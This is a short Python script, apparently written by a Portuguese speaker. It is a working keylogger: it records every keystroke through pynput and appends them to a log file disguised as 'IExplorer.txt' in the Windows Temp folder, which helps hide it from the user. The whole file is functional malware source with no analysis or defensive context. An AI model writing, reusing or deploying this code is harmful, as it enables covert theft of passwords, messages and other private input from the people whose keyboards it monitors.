from pynput.keyboard import Listener
import re

#arquivodolog = "C:/Users/victo/Desktop/klg/01.txt"
arquivodolog = "C:/Windows/Temp/IExplorer.txt"

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'','', tecla)
    tecla = re.sub(r'Key.space', '   ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.backspace', ' apaga ', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    print(tecla)

    with open(arquivodolog,"a") as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()

